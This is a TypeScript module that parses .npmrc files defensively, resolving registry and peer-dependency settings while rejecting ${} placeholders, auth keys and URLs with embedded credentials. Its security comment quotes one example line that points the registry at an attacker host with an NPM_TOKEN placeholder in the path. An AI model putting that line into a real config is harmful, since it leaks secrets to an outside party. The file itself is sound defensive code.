/**
 * .npmrc parsing.
 *
 * SECURITY — read this before changing anything here.
 *
 * A .npmrc committed to a repository is attacker-controlled the moment the repo
 * is cloned. npm expands ${VAR} placeholders in that file while *resolving*
 * dependencies — before any lifecycle script runs — so a line like
 *
 *     registry=https://attacker.example/${NPM_TOKEN}/
 *
 * exfiltrates environment secrets with no script execution at all. Because
 * nothing is executed, --ignore-scripts does not mitigate it. pnpm shipped a fix
 * for this class in June 2026 (GHSA-3qhv-2rgh-x77r); npm has no equivalent, so
 * we implement our own.
 *
 * The rules, all load-bearing:
 *   1. Read the file as raw text. Never shell out to `npm config`, which expands
 *      eagerly and would perform the exfiltration on our behalf.
 *   2. Reject any value containing '${'.
 *   3. Validate @scope:registry keys too — a top-level registry pin alone still
 *      leaves scoped keys pointing at an attacker host.
 *   4. Never read auth keys.
 *   5. The caller surfaces the effective registry in the UI. A visible redirect
 *      is a different risk class from a silent one.
 */

import type { ResolvedRegistry } from '../types.js';

export const DEFAULT_REGISTRY = 'https://registry.npmjs.org';

/** Credential keys we never read, in any config file. */
const AUTH_KEYS = new Set([
  '_authtoken',
  '_auth',
  '_password',
  'username',
  'email',
  'tokenhelper',
  'cert',
  'key',
  'certfile',
  'keyfile',
]);

export interface NpmrcEntry {
  key: string;
  value: string;
}

export interface ParseResult {
  entries: NpmrcEntry[];
  /** Keys dropped for containing '${'. Surfaced as a warning in the UI. */
  rejectedForExpansion: string[];
}

function isAuthKey(key: string): boolean {
  const lower = key.toLowerCase();
  if (AUTH_KEYS.has(lower)) return true;
  // URL-scoped credentials, e.g. //registry.npmjs.org/:_authToken
  if (lower.startsWith('//')) return true;
  return false;
}

/** Rule 2: any value containing a placeholder is refused outright. */
export function containsExpansion(value: string): boolean {
  return value.includes('${');
}

/**
 * Parse raw .npmrc text. Never expands anything, never reads auth keys.
 */
export function parseNpmrc(contents: string): ParseResult {
  const entries: NpmrcEntry[] = [];
  const rejectedForExpansion: string[] = [];

  for (const rawLine of contents.split(/\r?\n/)) {
    const line = rawLine.trim();
    if (line === '' || line.startsWith('#') || line.startsWith(';')) continue;

    const eq = line.indexOf('=');
    if (eq === -1) continue;

    const key = line.slice(0, eq).trim();
    let value = line.slice(eq + 1).trim();

    if (isAuthKey(key)) continue; // Rule 4.

    if (
      value.length >= 2 &&
      ((value.startsWith('"') && value.endsWith('"')) ||
        (value.startsWith("'") && value.endsWith("'")))
    ) {
      value = value.slice(1, -1);
    }

    if (containsExpansion(value)) {
      rejectedForExpansion.push(key); // Rule 2.
      continue;
    }

    entries.push({ key, value });
  }

  return { entries, rejectedForExpansion };
}

/** Only https/http URLs are usable as a registry. */
function isUsableRegistryUrl(value: string): boolean {
  try {
    const url = new URL(value);
    if (url.protocol !== 'https:' && url.protocol !== 'http:') return false;
    // Credentials embedded in the URL are another exfiltration shape.
    if (url.username !== '' || url.password !== '') return false;
    return true;
  } catch {
    return false;
  }
}

export interface ResolveOptions {
  /** Raw text of the project .npmrc, if it exists and is allowed to be read. */
  projectNpmrc?: string;
  /** Raw text of the user-level ~/.npmrc. */
  userNpmrc?: string;
  /**
   * False when the workspace is untrusted or the user disabled it. Project
   * config is skipped entirely; user config still applies.
   */
  allowProjectNpmrc: boolean;
}

export interface ResolveResult {
  registry: ResolvedRegistry;
  /** Keys dropped for containing '${', for display as a warning. */
  rejectedForExpansion: string[];
}

export type PeerPolicySource = 'default' | 'user-npmrc' | 'project-npmrc';

/** Resolution settings that materially change how peer findings are treated. */
export interface PeerResolutionPolicy {
  strictPeerDeps: boolean;
  legacyPeerDeps: boolean;
  sources: {
    strictPeerDeps: PeerPolicySource;
    legacyPeerDeps: PeerPolicySource;
  };
}

/**
 * Parse the two peer-resolution booleans without invoking `npm config`.
 *
 * The same security rules as registry resolution apply: project config is
 * ignored unless explicitly allowed, `${...}` values have already been
 * rejected by `parseNpmrc`, and auth material is never read. Invalid boolean
 * values are ignored rather than guessed.
 */
export function resolvePeerResolutionPolicy(options: ResolveOptions): PeerResolutionPolicy {
  let strictPeerDeps = false;
  let legacyPeerDeps = false;
  let strictSource: PeerPolicySource = 'default';
  let legacySource: PeerPolicySource = 'default';

  const layers: Array<{ text: string | undefined; source: Exclude<PeerPolicySource, 'default'> }> = [
    { text: options.userNpmrc, source: 'user-npmrc' },
    {
      text: options.allowProjectNpmrc ? options.projectNpmrc : undefined,
      source: 'project-npmrc',
    },
  ];

  for (const layer of layers) {
    if (layer.text === undefined) continue;
    for (const entry of parseNpmrc(layer.text).entries) {
      const key = entry.key.toLowerCase();
      const value = entry.value.toLowerCase();
      if (value !== 'true' && value !== 'false') continue;
      const enabled = value === 'true';
      if (key === 'strict-peer-deps' || key === 'strict-peer-dependencies') {
        strictPeerDeps = enabled;
        strictSource = layer.source;
      } else if (key === 'legacy-peer-deps') {
        legacyPeerDeps = enabled;
        legacySource = layer.source;
      }
    }
  }

  return {
    strictPeerDeps,
    legacyPeerDeps,
    sources: { strictPeerDeps: strictSource, legacyPeerDeps: legacySource },
  };
}

/**
 * Resolve the effective registry: project .npmrc (when allowed), then user
 * .npmrc, then the public registry. Scoped keys get the same validation as the
 * top-level key (Rule 3).
 */
export function resolveRegistry(options: ResolveOptions): ResolveResult {
  let url = DEFAULT_REGISTRY;
  let source: ResolvedRegistry['source'] = 'default';
  const scoped: Record<string, string> = {};
  const rejectedForExpansion: string[] = [];

  const layers: Array<{
    text: string | undefined;
    origin: 'user-npmrc' | 'project-npmrc';
  }> = [
    { text: options.userNpmrc, origin: 'user-npmrc' },
    // Project last so it wins — but only when explicitly allowed.
    {
      text: options.allowProjectNpmrc ? options.projectNpmrc : undefined,
      origin: 'project-npmrc',
    },
  ];

  for (const layer of layers) {
    if (layer.text === undefined) continue;
    const parsed = parseNpmrc(layer.text);
    rejectedForExpansion.push(...parsed.rejectedForExpansion);

    for (const entry of parsed.entries) {
      if (entry.key === 'registry') {
        if (isUsableRegistryUrl(entry.value)) {
          url = entry.value;
          source = layer.origin;
        }
        continue;
      }
      // Rule 3: @scope:registry gets validated exactly like the top-level key.
      const scopeMatch = /^(@[^:]+):registry$/.exec(entry.key);
      if (scopeMatch?.[1] !== undefined && isUsableRegistryUrl(entry.value)) {
        scoped[scopeMatch[1]] = entry.value;
      }
    }
  }

  return { registry: { url, source, scoped }, rejectedForExpansion };
}
